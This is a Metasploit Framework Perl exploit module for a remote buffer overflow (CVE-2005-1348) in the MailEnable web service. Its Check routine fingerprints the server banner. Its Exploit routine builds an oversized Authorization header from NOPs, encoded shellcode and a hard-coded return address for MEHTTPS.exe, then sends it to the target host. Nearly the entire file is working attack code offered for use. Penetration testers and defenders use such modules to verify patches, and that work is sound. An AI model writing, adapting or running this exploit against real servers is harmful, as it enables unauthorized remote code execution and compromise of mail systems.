##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mailenable_auth_header;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'MailEnable Authorization Header Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'David Maciejak <david dot maciejak at kyxar dot fr>' ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'win2003' ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8080],
		'SSL'   => [0, 'BOOL', 'Use SSL',1],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits a remote buffer overflow in the MailEnable web service.
	The vulnerability is triggered when a large value is placed into the Authorization
	header of the web request. MailEnable Enterprise Edition versions priot to 1.0.5 and
	MailEnable Professional versions prior to 1.55 are affected.
}),
	'Refs' =>
	  [
		['OSVDB', '15913'],
		['OSVDB', '15737'],
		['BID',   '13350'],
		['CVE',   '2005-1348'],
		['NSS',   '18123'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'  => ['+ws2ord'],
	  },

	'Targets' =>
	  [
		['MEHTTPS.exe Universal',    0x006c36b7 ], #MEHTTPS.EXE
	  ],

	'Keys' => ['mailenable'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET / HTTP/1.0\r\n\r\n");
	my $res = $s->Recv(-1, 5);
	$s->Close();

	if (! $res) {
		$self->PrintLine("[*] No response to request");
		return $self->CheckCode('Generic');
	}

	if ($res =~ /^Server: .*MailEnable/)
	{
		$self->PrintLine("[*] Server MailEnable may be vulnerable");
		return $self->CheckCode('Appears');
	}
	else
	{
		$self->PrintLine("[*] Server is probably not vulnerable");
		return $self->CheckCode('Safe');
	}
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $target_port    = $self->GetVar('RPORT');
	my $shellcode      = $self->GetVar('EncodedPayload')->Payload;
	my $target_idx     = $self->GetVar('TARGET');
	my $target         = $self->Targets->[$target_idx];

	my $nop = "\x90\x24";

	my $bof = $nop.$shellcode.pack('V',$target->[1]);
	my $ric = "GET / HTTP/1.0\r\n";
	my $ric2 = "Authorization: $bof\r\n\r\n";

	my $request = $ric.$ric2;

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target");

	$s->Send($request);
	$s->Close();
	return;
}

1;

